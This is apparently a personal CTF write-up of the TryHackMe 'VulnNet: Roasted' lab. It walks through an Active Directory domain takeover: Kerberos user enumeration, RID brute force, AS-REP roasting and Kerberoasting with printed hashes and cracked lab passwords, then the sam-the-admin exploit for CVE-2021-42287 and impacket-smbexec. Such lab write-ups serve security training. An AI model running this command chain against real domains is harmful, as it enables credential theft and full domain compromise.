---
title: "VulnNet: Roasted"
date: 2026-07-28 09:00:00 +0800
categories: [TryHackMe,redteam]
tags: [tryhackme, active-directory, Easy, kerberos, windows]
description: "TryHackMe VulnNet: Roasted write-up — roasting Kerberos accounts to take over the domain."
image:
  path: /assets/img/posts/thm/VulnNetRoasted/VulnetRoasted.png
  alt: "VulnNet: Roasted"
---

### LAB info
**Link : [VulnNet: Roasted](https://tryhackme.com/room/vulnnetroasted)**

**Description : VulnNet Entertainment quickly deployed another management instance on their very broad network...**

**Difficulty : Easy**

### Nmap discover open port


```bash
nmap -sCV -Pn 10.48.146.159 -p- 
```

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-24 13:56:11Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49673/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49713/tcp open  msrpc         Microsoft Windows RPC
49808/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windows
```

### kerbrute username

try to brute force for the username 

```bash
./kerbrute_linux_amd64 userenum --dc vulnnet-rst.local -d vulnnet-rst.local /usr/share/seclists/Usernames/Names/names.txt -v
```

try with other wordlist 
```bash
./kerbrute_linux_amd64 userenum --dc vulnnet-rst.local -d vulnnet-rst.local /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt -v
```

![Image1](/assets/img/posts/thm/VulnNetRoasted/VulnetRoasted-1.png)

guest@vulnnet-rst.local

### SMB enumeration

```bash
netexec smb vulnnet-rst.local -u guest -p '' --shares
```

![Image2](/assets/img/posts/thm/VulnNetRoasted/VulnetRoasted-2.png)

```bash
smbclient //vulnnet-rst.local/VulnNet-Business-Anonymous -U vulnnet-rst.local/guest%
```

### RID bruteforce

rid is the last few digit in the SID usch 500 administrator 

so this is to bruteforce form 500 - 1111 to look for the any user 
```bash
netexec smb 10.48.147.26 -u 'guest' -p '' --rid-brute
```

![Image3](/assets/img/posts/thm/VulnNetRoasted/VulnetRoasted-3.png)

the user we get 
```
enterprise-core-vn
a-whitehat
t-skid
j-goldenhand
j-leet
```

###  AS-REP Roasting attack

try performing AS-REP Roasting incase the user we get have pre-authentication disable 

#### The 2-Step Ticket Booth Exchange

```
[ Your Computer ] ───────────────── AS-REQ ────────────────> [ Domain Controller ]
                  <──────────────── AS-REP ───────────────── 
```

1. **AS-REQ (Authentication Service Request):**
    
    Your computer knocks on the Domain Controller's door and says: _"Hey, I'm `t-skid`. Here is proof of my identity (timestamp encrypted with my password). Please let me into the park."_
    
2. **AS-REP (Authentication Service Reply):**
    
    The Domain Controller verifies your proof. If it matches, it replies with the **AS-REP**. This message contains your **TGT (Ticket Granting Ticket)**—your main wristband to enter the park—and a session key.

SO this attack is perfrom if the user have pre-authentication turned off so it can just enter the domain without password and the domain controller will hand it a TGT which encrypted with the user password and we can crack offline . 

get npu - no preauthentication user 


```bash
impacket-GetNPUsers vulnnet-rst.local/ -no-pass -usersfile user.txt -dc-ip 10.48.147.26 
```

```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[-] User enterprise-core-vn doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User a-whitehat doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:a25c3ba29877014983d84fc96926238a$9ab046b49e6eeb350ab9bbf6352e338bb09348e21740db0f1e8f8794a1204b70f1531c7e942b2783cfccdbce79ae48ff0f0d4446fb09e22ac2b912dfde63bb5c94c16e60192a4b55976eaa172c2530e8da8e0563a3b5028d75fe66cbf2b0c0cf82fcaf3498c5accd0aa3a9ebfea012c49824b9f47952e485388ee4b035fbb2cb016d3df492e20800831c86dd4b964d2305bda13c761b18c8aaf5cbc682563212925663906f790fa9478a7c91d8936a44c4d93178a876b1aea8b12c0138e007e9ad8e6f48124e33a9df8b0c7b9be76461164b985e735ab7a4f68861e3200c80b8226295ff48733fc61a0348790659f43bb45c23caa677
[-] User j-goldenhand doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j-leet doesn't have UF_DONT_REQUIRE_PREAUTH set
```

 ok we get the hash for the user t-skid

### Crack 

now hashcat crack it 

```cmd 
hashcat.exe -m 18200 ..\hash.txt ..\rockyou.txt
```

```password 
t-skid
tj072889*
```

### bloodhound

now check with ldap if can we can bloodhound dump 

```bash
netexec ldap vulnnet-rst.local -u 't-skid' -p 'tj072889*' --port 389 --users
```

![Image4](/assets/img/posts/thm/VulnNetRoasted/VulnetRoasted-4.png)

now we can just use bloodhound 

```bash
bloodhound-ce-python -u 't-skid' -p 'tj072889*' -d vulnnet-rst.local -dc WIN-2BO8M1OE1M1.vulnnet-rst.local -ns 10.48.147.26 -c All
```

### kerberos attacks

when look for kerberoastable i found the service  account enterprise-core-vn

```bash
impacket-GetUserSPNs 'vulnnet-rst.local/t-skid:tj072889*' -dc-ip 10.48.147.26 request
```

```output
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName    Name                MemberOf                                                       PasswordLastSet             LastLogon                   Delegation 
----------------------  ------------------  -------------------------------------------------------------  --------------------------  --------------------------  ----------
CIFS/vulnnet-rst.local  enterprise-core-vn  CN=Remote Management Users,CN=Builtin,DC=vulnnet-rst,DC=local  2021-03-11 14:45:09.913979  2021-03-13 18:41:17.987528             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*enterprise-core-vn$VULNNET-RST.LOCAL$vulnnet-rst.local/enterprise-core-vn*$79b085def527f51b7632d1a49f989354$4b96af4fcc033b9ce01d695b6fb95d965eb436572a813be5fe928cf17edaa8c8842f190f8709867affb085c4bf9f747e3e3ab3288351fc5d45ec87714de9a8e1d493b5c6a7050bb9f9e418988fe17e9abcc2e8ba7c40dd8f76c05f6e079cf0dfad8333f6065b7bfcfd3bad6da052cdbf2181be8fef0833d58a1c928bb9defd089ce9fbdba212de8aa0af64e2f343735b00d9de2b9af64ce845015a35a6172fe65416aac7b062647685bb9be413f451412daf3972180b0a71955839af73a386ce676c5ab83750f0ce47211e8731e74670d03fd00281bbb9e929107fd381daf34d42c0830a4f46f3e1088bf2f0ecb736687d1bb536fe3ea85b01f3117fd870026d939996dc32e7a188d1e553686478dad49d017792a26eb6f545ce7144fa638ba80ff7874c6149e17a39b484d150c08f3e16f4eddaf7abbb4a619622f12e781316538915982c6b61f48f8ef67d1590cb34f62a64609064b7102e3f72285086f069e80fa704fbf9b4751739d7a37d91cdd34c0a876c270fcc5746c49037d75781b726fba2b431a5095d9b94f2b3c9495ebb777e559e905e36eb2740ba2017981540c6a5f94db756c8c9e23c49b8431f6e6410f47c65c12a4737ed5138d272cf0056a20b00b073fae46b6911efe6038ad2f3a0f8fd4f81a559e00b4a101dbe784dd8edfb0e2906717db85872761ed5e07b19de4d6d2db09249eb0a6a9e6b37d39f1095febe10dc08652c71227add6fe88373be9c97f4ebef7af0bc56c1b25154496685299b8f3bec3c67d6c979117d370c4837f1a23afb3a35f6839ed39c343d14416892a858a0ec61421483e6bc950841506e1ece265836da2e036872ee5a59d82a90c058cb4424378009ba4b6d9408c78b19304de9dd9e1e57a29683222b67da5ed5c8d8fa1d3414fe7bbd08ce1336c91c36e6bde743c39b26bc5443fcb9c06f3fe38e2534f5ea1413b613758415c8c7790ed4568dff3768589f87d7bed9b2563db283522121baea5fc71fee25fff8b9a376d203aa380a27b5a50f2cb43007d097141bb0f04613bdad76cf24415ef0713aaf5a2118ccbe351f1598b306aa6362431e56356e338b8d249e1c096a23ec17352f1cfee78d4973061342f4a22575b854b51d7f7fb44dde8a22c4916f935fe6c9cb41a15e1c36ac237d5067f9d694be55c715615acbfe642942bc5b1d78dd45618cbd4433592c0428f3f578a4c5beee289c98aea99662a72613c30d2d3f8ccfda77ecda6b6979b6f5541e8764a650701cd34114e04a10750e1e16883495cfe15411f3065c217af62d825063d47737632be435ad5ed5716e2f9c63042790ba0119672e3bd8501cf529a67fc64a18e334e9f804f2c5017a12399c2b7f0af0a016b4403d7e4fb9f25faea37bdd7e2e
```

crack with hashcat 

```output
enterprise-core-vn
ry=ibfkfv,s6h,
```

### Eunm and get user txt

start again with normal enumeration

```bash
netexec smb vulnnet-rst.local -u 'enterprise-core-vn' -p 'ry=ibfkfv,s6h,' --shares
```

![Image5](/assets/img/posts/thm/VulnNetRoasted/VulnetRoasted-5.png)

nothing useful try with winrm 

```bash
netexec winrm vulnnet-rst.local -u 'enterprise-core-vn' -p 'ry=ibfkfv,s6h,'
```

![Image6](/assets/img/posts/thm/VulnNetRoasted/VulnetRoasted-6.png)

finally we can winrm 

![Image7](/assets/img/posts/thm/VulnNetRoasted/VulnetRoasted-7.png)

we get the user.txt

### Enum on env

9. when i check with current priv found smtg intersesting 
![Image8](/assets/img/posts/thm/VulnNetRoasted/VulnetRoasted-8.png)

SeMachineAccountPrivilege is enabled and after some google it is related with cve 

https://medium.com/@mvelazco/hunting-for-samaccountname-spoofing-cve-2021-42287-and-domain-controller-impersonation-f704513c8a45

### get the POC

then i go donwload the poc

https://github.com/safebuffer/sam-the-admin/tree/main

```bash
python3 sam_the_admin.py 'vulnnet-rst.local/enterprise-core-vn:ry=ibfkfv,s6h,' -dc-ip vulnnet-rst.local
```

```bash
impacket-smbexec -target-ip vulnnet-rst.local -dc-ip vulnnet-rst.local -k -no-pass @'win-2bo8m1oe1m1.vulnnet-rst.local'
```

smbexec is fileless so we cannot cd 
psexec will upload a file on the target machine so can cd and may be detected 

### Root flag

finally we get the root flag
![Image9](/assets/img/posts/thm/VulnNetRoasted/VulnetRoasted-9.png)
